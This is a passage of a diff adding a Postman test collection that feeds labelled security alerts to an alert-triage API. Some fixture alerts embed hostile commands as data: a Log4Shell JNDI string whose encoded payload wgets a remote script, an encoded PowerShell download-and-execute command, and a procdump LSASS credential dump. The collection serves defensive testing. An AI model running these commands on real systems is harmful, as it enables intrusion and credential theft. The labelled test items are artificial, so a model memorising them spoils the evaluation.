+                  "pm.test('status is 202, or 502 if IRIS is unreachable for an escalated alert', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  const json = pm.response.json();",
+                  "  pm.test('alert stored with a valid status and triage result', () => {",
+                  "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
+                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.triage).to.have.property('is_true_positive');",
+                  "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
+                  "  });",
+                  "  const expected = pm.info.requestName.endsWith('-> TP') ? 'escalated' : 'suppressed';",
+                  "  // Informational only: the verdict depends on the triage engine (LLM vs mock),",
+                  "  // so it is logged instead of asserted. Compare with the expected ground truth.",
+                  "  console.log(`${pm.info.requestName}: got ${json.status} (${json.triage.engine}), expected ~${expected}`);",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Suricata: Log4Shell JNDI exploit attempt (rule 86601, lvl 3) -> TP",
+          "id": "bfb9ddf9-1926-4f0a-8100-afee9a3f0994",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"1727791210.100010\",\n  \"timestamp\": \"2026-10-01T14:29:02.551+0000\",\n  \"rule\": {\n    \"id\": \"86601\",\n    \"level\": 3,\n    \"description\": \"Suricata: Alert - ET EXPLOIT Apache log4j RCE Attempt - 2021/12/12 Obfuscation Observed M2 (udp) (CVE-2021-44228)\",\n    \"groups\": [\n      \"ids\",\n      \"suricata\"\n    ]\n  },\n  \"agent\": {\n    \"id\": \"010\",\n    \"name\": \"lab-ids01\",\n    \"ip\": \"10.64.0.10\"\n  },\n  \"manager\": {\n    \"name\": \"wazuh-manager\"\n  },\n  \"decoder\": {\n    \"name\": \"json\"\n  },\n  \"location\": \"/var/log/suricata/eve.json\",\n  \"data\": {\n    \"timestamp\": \"2026-10-01T14:29:02.551234+0000\",\n    \"flow_id\": \"1532465813348012\",\n    \"in_iface\": \"ens19\",\n    \"event_type\": \"alert\",\n    \"src_ip\": \"45.155.205.233\",\n    \"src_port\": \"41822\",\n    \"dest_ip\": \"10.64.0.21\",\n    \"dest_port\": \"8080\",\n    \"proto\": \"TCP\",\n    \"app_proto\": \"http\",\n    \"alert\": {\n      \"action\": \"allowed\",\n      \"gid\": \"1\",\n      \"signature_id\": \"2034783\",\n      \"rev\": \"2\",\n      \"signature\": \"ET EXPLOIT Apache log4j RCE Attempt - 2021/12/12 Obfuscation Observed M2 (udp) (CVE-2021-44228)\",\n      \"category\": \"Attempted Administrator Privilege Gain\",\n      \"severity\": \"1\"\n    },\n    \"http\": {\n      \"hostname\": \"10.64.0.21\",\n      \"url\": \"/api/login\",\n      \"http_method\": \"POST\",\n      \"http_user_agent\": \"${jndi:ldap://45.155.205.233:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNDUuMTU1LjIwNS4yMzMveC5zaA==}\",\n      \"status\": \"500\"\n    }\n  },\n  \"full_log\": \"{\\\"timestamp\\\":\\\"2026-10-01T14:29:02.551234+0000\\\",\\\"flow_id\\\":1532465813348012,\\\"in_iface\\\":\\\"ens19\\\",\\\"event_type\\\":\\\"alert\\\",\\\"src_ip\\\":\\\"45.155.205.233\\\",\\\"src_port\\\":41822,\\\"dest_ip\\\":\\\"10.64.0.21\\\",\\\"dest_port\\\":8080,\\\"proto\\\":\\\"TCP\\\",\\\"alert\\\":{\\\"action\\\":\\\"allowed\\\",\\\"signature_id\\\":2034783,\\\"signature\\\":\\\"ET EXPLOIT Apache log4j RCE Attempt (CVE-2021-44228)\\\",\\\"category\\\":\\\"Attempted Administrator Privilege Gain\\\",\\\"severity\\\":1},\\\"http\\\":{\\\"url\\\":\\\"/api/login\\\",\\\"http_user_agent\\\":\\\"${jndi:ldap://45.155.205.233:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNDUuMTU1LjIwNS4yMzMveC5zaA==}\\\",\\\"status\\\":500}}\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "Expected ground truth: true positive - Wazuh gives every Suricata alert level 3, so mock says FP; LLM should catch it."
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202, or 502 if IRIS is unreachable for an escalated alert', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  const json = pm.response.json();",
+                  "  pm.test('alert stored with a valid status and triage result', () => {",
+                  "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
+                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.triage).to.have.property('is_true_positive');",
+                  "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
+                  "  });",
+                  "  const expected = pm.info.requestName.endsWith('-> TP') ? 'escalated' : 'suppressed';",
+                  "  // Informational only: the verdict depends on the triage engine (LLM vs mock),",
+                  "  // so it is logged instead of asserted. Compare with the expected ground truth.",
+                  "  console.log(`${pm.info.requestName}: got ${json.status} (${json.triage.engine}), expected ~${expected}`);",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Suricata: internal host package update flagged as policy (lvl 3) -> FP",
+          "id": "5cbef575-a596-4268-91f6-367496b76346",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"1727791211.100011\",\n  \"timestamp\": \"2026-10-01T14:30:11.090+0000\",\n  \"rule\": {\n    \"id\": \"86601\",\n    \"level\": 3,\n    \"description\": \"Suricata: Alert - ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management\",\n    \"groups\": [\n      \"ids\",\n      \"suricata\"\n    ]\n  },\n  \"agent\": {\n    \"id\": \"010\",\n    \"name\": \"lab-ids01\",\n    \"ip\": \"10.64.0.10\"\n  },\n  \"manager\": {\n    \"name\": \"wazuh-manager\"\n  },\n  \"decoder\": {\n    \"name\": \"json\"\n  },\n  \"location\": \"/var/log/suricata/eve.json\",\n  \"data\": {\n    \"event_type\": \"alert\",\n    \"src_ip\": \"10.64.0.21\",\n    \"src_port\": \"50544\",\n    \"dest_ip\": \"91.189.91.83\",\n    \"dest_port\": \"80\",\n    \"proto\": \"TCP\",\n    \"app_proto\": \"http\",\n    \"alert\": {\n      \"action\": \"allowed\",\n      \"signature_id\": \"2013504\",\n      \"signature\": \"ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management\",\n      \"category\": \"Not Suspicious Traffic\",\n      \"severity\": \"3\"\n    },\n    \"http\": {\n      \"hostname\": \"archive.ubuntu.com\",\n      \"url\": \"/ubuntu/dists/noble-updates/InRelease\",\n      \"http_user_agent\": \"Debian APT-HTTP/1.3 (2.7.14build2)\"\n    }\n  },\n  \"full_log\": \"{\\\"event_type\\\":\\\"alert\\\",\\\"src_ip\\\":\\\"10.64.0.21\\\",\\\"dest_ip\\\":\\\"91.189.91.83\\\",\\\"dest_port\\\":80,\\\"alert\\\":{\\\"signature\\\":\\\"ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management\\\",\\\"category\\\":\\\"Not Suspicious Traffic\\\",\\\"severity\\\":3},\\\"http\\\":{\\\"hostname\\\":\\\"archive.ubuntu.com\\\",\\\"url\\\":\\\"/ubuntu/dists/noble-updates/InRelease\\\",\\\"http_user_agent\\\":\\\"Debian APT-HTTP/1.3 (2.7.14build2)\\\"}}\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "Expected ground truth: false positive."
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202, or 502 if IRIS is unreachable for an escalated alert', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  const json = pm.response.json();",
+                  "  pm.test('alert stored with a valid status and triage result', () => {",
+                  "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
+                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.triage).to.have.property('is_true_positive');",
+                  "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
+                  "  });",
+                  "  const expected = pm.info.requestName.endsWith('-> TP') ? 'escalated' : 'suppressed';",
+                  "  // Informational only: the verdict depends on the triage engine (LLM vs mock),",
+                  "  // so it is logged instead of asserted. Compare with the expected ground truth.",
+                  "  console.log(`${pm.info.requestName}: got ${json.status} (${json.triage.engine}), expected ~${expected}`);",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Windows: multiple logon failures / password spray (rule 60204, lvl 10) -> TP",
+          "id": "3735c1ae-f3b1-47b6-9386-6271cd1ae8b4",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"1727791212.100012\",\n  \"timestamp\": \"2026-10-01T14:31:27.640+0000\",\n  \"rule\": {\n    \"id\": \"60204\",\n    \"level\": 10,\n    \"description\": \"Multiple Windows Logon Failures\",\n    \"groups\": [\n      \"windows\",\n      \"windows_security\",\n      \"authentication_failures\"\n    ],\n    \"frequency\": 8,\n    \"mitre\": {\n      \"id\": [\n        \"T1110\"\n      ],\n      \"tactic\": [\n        \"Credential Access\"\n      ],\n      \"technique\": [\n        \"Brute Force\"\n      ]\n    }\n  },\n  \"agent\": {\n    \"id\": \"007\",\n    \"name\": \"LAB-DC01\",\n    \"ip\": \"10.64.0.5\"\n  },\n  \"manager\": {\n    \"name\": \"wazuh-manager\"\n  },\n  \"decoder\": {\n    \"name\": \"windows_eventchannel\"\n  },\n  \"location\": \"EventChannel\",\n  \"data\": {\n    \"win\": {\n      \"system\": {\n        \"providerName\": \"Microsoft-Windows-Security-Auditing\",\n        \"eventID\": \"4625\",\n        \"channel\": \"Security\",\n        \"computer\": \"LAB-DC01.lab.local\",\n        \"severityValue\": \"AUDIT_FAILURE\",\n        \"message\": \"\\\"An account failed to log on.\\\"\"\n      },\n      \"eventdata\": {\n        \"targetUserName\": \"administrator\",\n        \"targetDomainName\": \"LAB\",\n        \"status\": \"0xc000006d\",\n        \"subStatus\": \"0xc000006a\",\n        \"logonType\": \"3\",\n        \"authenticationPackageName\": \"NTLM\",\n        \"workstationName\": \"KALI\",\n        \"ipAddress\": \"10.64.0.199\",\n        \"ipPort\": \"0\",\n        \"processName\": \"-\"\n      }\n    }\n  },\n  \"full_log\": \"An account failed to log on. Logon Type: 3. Account: LAB\\\\administrator. Failure: 0xc000006d/0xc000006a (bad password). Workstation: KALI. Source Network Address: 10.64.0.199. 8 failures within 120s.\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "Expected ground truth: true positive."
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202, or 502 if IRIS is unreachable for an escalated alert', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  const json = pm.response.json();",
+                  "  pm.test('alert stored with a valid status and triage result', () => {",
+                  "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
+                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.triage).to.have.property('is_true_positive');",
+                  "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
+                  "  });",
+                  "  const expected = pm.info.requestName.endsWith('-> TP') ? 'escalated' : 'suppressed';",
+                  "  // Informational only: the verdict depends on the triage engine (LLM vs mock),",
+                  "  // so it is logged instead of asserted. Compare with the expected ground truth.",
+                  "  console.log(`${pm.info.requestName}: got ${json.status} (${json.triage.engine}), expected ~${expected}`);",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Sysmon: encoded PowerShell from Word macro (rule 92057, lvl 12) -> TP",
+          "id": "c7477d89-4ad7-4279-8f22-f7c6f813e19e",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"1727791213.100013\",\n  \"timestamp\": \"2026-10-01T14:32:50.208+0000\",\n  \"rule\": {\n    \"id\": \"92057\",\n    \"level\": 12,\n    \"description\": \"Powershell.exe spawned a powershell process which executed a base64 encoded command\",\n    \"groups\": [\n      \"sysmon\",\n      \"sysmon_eid1_detections\",\n      \"windows\"\n    ],\n    \"mitre\": {\n      \"id\": [\n        \"T1059.001\",\n        \"T1027\"\n      ],\n      \"tactic\": [\n        \"Execution\",\n        \"Defense Evasion\"\n      ],\n      \"technique\": [\n        \"PowerShell\",\n        \"Obfuscated Files or Information\"\n      ]\n    }\n  },\n  \"agent\": {\n    \"id\": \"008\",\n    \"name\": \"LAB-WS12\",\n    \"ip\": \"10.64.0.112\"\n  },\n  \"manager\": {\n    \"name\": \"wazuh-manager\"\n  },\n  \"decoder\": {\n    \"name\": \"windows_eventchannel\"\n  },\n  \"location\": \"EventChannel\",\n  \"data\": {\n    \"win\": {\n      \"system\": {\n        \"providerName\": \"Microsoft-Windows-Sysmon\",\n        \"eventID\": \"1\",\n        \"channel\": \"Microsoft-Windows-Sysmon/Operational\",\n        \"computer\": \"LAB-WS12.lab.local\"\n      },\n      \"eventdata\": {\n        \"image\": \"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\WindowsPowerShell\\\\\\\\v1.0\\\\\\\\powershell.exe\",\n        \"commandLine\": \"powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADQAMgAvAGEAJwApAA==\",\n        \"parentImage\": \"C:\\\\\\\\Program Files\\\\\\\\Microsoft Office\\\\\\\\root\\\\\\\\Office16\\\\\\\\WINWORD.EXE\",\n        \"parentCommandLine\": \"\\\"WINWORD.EXE\\\" /n \\\"C:\\\\\\\\Users\\\\\\\\kovacs.anna\\\\\\\\Downloads\\\\\\\\Szamla_2026_09.docm\\\"\",\n        \"user\": \"LAB\\\\\\\\kovacs.anna\",\n        \"integrityLevel\": \"Medium\",\n        \"hashes\": \"SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C\"\n      }\n    }\n  },\n  \"full_log\": \"Process Create: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADQAMgAvAGEAJwApAA== | ParentImage: WINWORD.EXE (Szamla_2026_09.docm) | User: LAB\\\\kovacs.anna\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "Expected ground truth: true positive."
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202, or 502 if IRIS is unreachable for an escalated alert', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  const json = pm.response.json();",
+                  "  pm.test('alert stored with a valid status and triage result', () => {",
+                  "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
+                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.triage).to.have.property('is_true_positive');",
+                  "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
+                  "  });",
+                  "  const expected = pm.info.requestName.endsWith('-> TP') ? 'escalated' : 'suppressed';",
+                  "  // Informational only: the verdict depends on the triage engine (LLM vs mock),",
+                  "  // so it is logged instead of asserted. Compare with the expected ground truth.",
+                  "  console.log(`${pm.info.requestName}: got ${json.status} (${json.triage.engine}), expected ~${expected}`);",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Sysmon: LSASS memory access by procdump (rule 92900, lvl 12) -> TP",
+          "id": "6782a1c3-170f-474a-b476-60c2431e893e",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"1727791214.100014\",\n  \"timestamp\": \"2026-10-01T14:33:41.917+0000\",\n  \"rule\": {\n    \"id\": \"92900\",\n    \"level\": 12,\n    \"description\": \"Lsass process was accessed by C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\pd64.exe with read permissions, possible credential dump\",\n    \"groups\": [\n      \"sysmon\",\n      \"sysmon_eid10_detections\",\n      \"windows\"\n    ],\n    \"mitre\": {\n      \"id\": [\n        \"T1003.001\"\n      ],\n      \"tactic\": [\n        \"Credential Access\"\n      ],\n      \"technique\": [\n        \"LSASS Memory\"\n      ]\n    }\n  },\n  \"agent\": {\n    \"id\": \"008\",\n    \"name\": \"LAB-WS12\",\n    \"ip\": \"10.64.0.112\"\n  },\n  \"manager\": {\n    \"name\": \"wazuh-manager\"\n  },\n  \"decoder\": {\n    \"name\": \"windows_eventchannel\"\n  },\n  \"location\": \"EventChannel\",\n  \"data\": {\n    \"win\": {\n      \"system\": {\n        \"providerName\": \"Microsoft-Windows-Sysmon\",\n        \"eventID\": \"10\",\n        \"channel\": \"Microsoft-Windows-Sysmon/Operational\",\n        \"computer\": \"LAB-WS12.lab.local\"\n      },\n      \"eventdata\": {\n        \"sourceImage\": \"C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\pd64.exe\",\n        \"targetImage\": \"C:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\lsass.exe\",\n        \"grantedAccess\": \"0x1fffff\",\n        \"sourceUser\": \"LAB\\\\\\\\kovacs.anna\"\n      }\n    }\n  },\n  \"full_log\": \"Process accessed: SourceImage C:\\\\Users\\\\Public\\\\pd64.exe -accepteula -ma lsass.exe C:\\\\Users\\\\Public\\\\l.dmp -> TargetImage C:\\\\Windows\\\\system32\\\\lsass.exe GrantedAccess 0x1fffff\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "Expected ground truth: true positive."
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202, or 502 if IRIS is unreachable for an escalated alert', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  const json = pm.response.json();",
+                  "  pm.test('alert stored with a valid status and triage result', () => {",
+                  "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
+                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.triage).to.have.property('is_true_positive');",
+                  "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
+                  "  });",
+                  "  const expected = pm.info.requestName.endsWith('-> TP') ? 'escalated' : 'suppressed';",
+                  "  // Informational only: the verdict depends on the triage engine (LLM vs mock),",
+                  "  // so it is logged instead of asserted. Compare with the expected ground truth.",
+                  "  console.log(`${pm.info.requestName}: got ${json.status} (${json.triage.engine}), expected ~${expected}`);",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Windows: scheduled service logon (4624 type 5, lvl 3) -> FP",
+          "id": "07091283-25c7-41af-94a7-1dc19d5f02a0",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"1727791215.100015\",\n  \"timestamp\": \"2026-10-01T14:34:00.003+0000\",\n  \"rule\": {\n    \"id\": \"60106\",\n    \"level\": 3,\n    \"description\": \"Windows Logon Success\",\n    \"groups\": [\n      \"windows\",\n      \"windows_security\",\n      \"authentication_success\"\n    ],\n    \"mitre\": {\n      \"id\": [\n        \"T1078\"\n      ],\n      \"tactic\": [\n        \"Defense Evasion\",\n        \"Persistence\",\n        \"Privilege Escalation\",\n        \"Initial Access\"\n      ],\n      \"technique\": [\n        \"Valid Accounts\"\n      ]\n    }\n  },\n  \"agent\": {\n    \"id\": \"007\",\n    \"name\": \"LAB-DC01\",\n    \"ip\": \"10.64.0.5\"\n  },\n  \"manager\": {\n    \"name\": \"wazuh-manager\"\n  },\n  \"decoder\": {\n    \"name\": \"windows_eventchannel\"\n  },\n  \"location\": \"EventChannel\",\n  \"data\": {\n    \"win\": {\n      \"system\": {\n        \"providerName\": \"Microsoft-Windows-Security-Auditing\",\n        \"eventID\": \"4624\",\n        \"channel\": \"Security\",\n        \"computer\": \"LAB-DC01.lab.local\",\n        \"severityValue\": \"AUDIT_SUCCESS\"\n      },\n      \"eventdata\": {\n        \"targetUserName\": \"SYSTEM\",\n        \"targetDomainName\": \"NT AUTHORITY\",\n        \"logonType\": \"5\",\n        \"logonProcessName\": \"Advapi\",\n        \"processName\": \"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\services.exe\",\n        \"ipAddress\": \"-\"\n      }\n    }\n  },\n  \"full_log\": \"An account was successfully logged on. Logon Type: 5 (Service). Account: NT AUTHORITY\\\\SYSTEM. Process: C:\\\\Windows\\\\System32\\\\services.exe.\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "Expected ground truth: false positive."
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202, or 502 if IRIS is unreachable for an escalated alert', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  const json = pm.response.json();",
+                  "  pm.test('alert stored with a valid status and triage result', () => {",
+                  "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
+                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.triage).to.have.property('is_true_positive');",
+                  "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
+                  "  });",
+                  "  const expected = pm.info.requestName.endsWith('-> TP') ? 'escalated' : 'suppressed';",
+                  "  // Informational only: the verdict depends on the triage engine (LLM vs mock),",
+                  "  // so it is logged instead of asserted. Compare with the expected ground truth.",
+                  "  console.log(`${pm.info.requestName}: got ${json.status} (${json.triage.engine}), expected ~${expected}`);",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "FortiGate IPS: Fortinet SSL-VPN exploit blocked (lvl 11) -> TP",
+          "id": "de26604d-0655-4238-9a04-f1fd26e4097a",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"1727791216.100016\",\n  \"timestamp\": \"2026-10-01T14:35:19.400+0000\",\n  \"rule\": {\n    \"id\": \"81628\",\n    \"level\": 11,\n    \"description\": \"Fortigate: IPS attack detected.\",\n    \"groups\": [\n      \"fortigate\",\n      \"syslog\",\n      \"ids\",\n      \"attack\"\n    ],\n    \"mitre\": {\n      \"id\": [\n        \"T1190\"\n      ],\n      \"tactic\": [\n        \"Initial Access\"\n      ],\n      \"technique\": [\n        \"Exploit Public-Facing Application\"\n      ]\n    }\n  },\n  \"agent\": {\n    \"id\": \"000\",\n    \"name\": \"wazuh-manager\"\n  },\n  \"manager\": {\n    \"name\": \"wazuh-manager\"\n  },\n  \"decoder\": {\n    \"parent\": \"fortigate-firewall-v6\",\n    \"name\": \"fortigate-firewall-v6\"\n  },\n  \"location\": \"10.64.0.1\",\n  \"data\": {\n    \"srcip\": \"193.233.48.112\",\n    \"dstip\": \"10.64.0.1\",\n    \"dstport\": \"10443\",\n    \"action\": \"dropped\",\n    \"attack\": \"Fortinet.FortiOS.SSL.VPN.Heap.Buffer.Overflow\",\n    \"severity\": \"critical\",\n    \"devname\": \"LAB-FGT01\",\n    \"ref\": \"http://www.fortinet.com/ids/VID59365\"\n  },\n  \"full_log\": \"date=2026-10-01 time=14:35:19 devname=\\\"LAB-FGT01\\\" devid=\\\"FGT60F0000000000\\\" logid=\\\"0419016384\\\" type=\\\"utm\\\" subtype=\\\"ips\\\" eventtype=\\\"signature\\\" level=\\\"alert\\\" severity=\\\"critical\\\" srcip=193.233.48.112 srcport=55210 dstip=10.64.0.1 dstport=10443 proto=6 service=\\\"HTTPS\\\" action=\\\"dropped\\\" attack=\\\"Fortinet.FortiOS.SSL.VPN.Heap.Buffer.Overflow\\\" attackid=59365 ref=\\\"http://www.fortinet.com/ids/VID59365\\\" msg=\\\"misc: Fortinet.FortiOS.SSL.VPN.Heap.Buffer.Overflow\\\"\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "Expected ground truth: true positive (blocked, but targeted exploit)."
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202, or 502 if IRIS is unreachable for an escalated alert', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  const json = pm.response.json();",
+                  "  pm.test('alert stored with a valid status and triage result', () => {",
+                  "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
+                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.triage).to.have.property('is_true_positive');",
+                  "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
+                  "  });",
+                  "  const expected = pm.info.requestName.endsWith('-> TP') ? 'escalated' : 'suppressed';",
+                  "  // Informational only: the verdict depends on the triage engine (LLM vs mock),",
+                  "  // so it is logged instead of asserted. Compare with the expected ground truth.",
+                  "  console.log(`${pm.info.requestName}: got ${json.status} (${json.triage.engine}), expected ~${expected}`);",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "AWS CloudTrail: root console login without MFA (lvl 10) -> TP",
+          "id": "4fa6afb5-e64d-469e-ad4e-fc7220493268",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
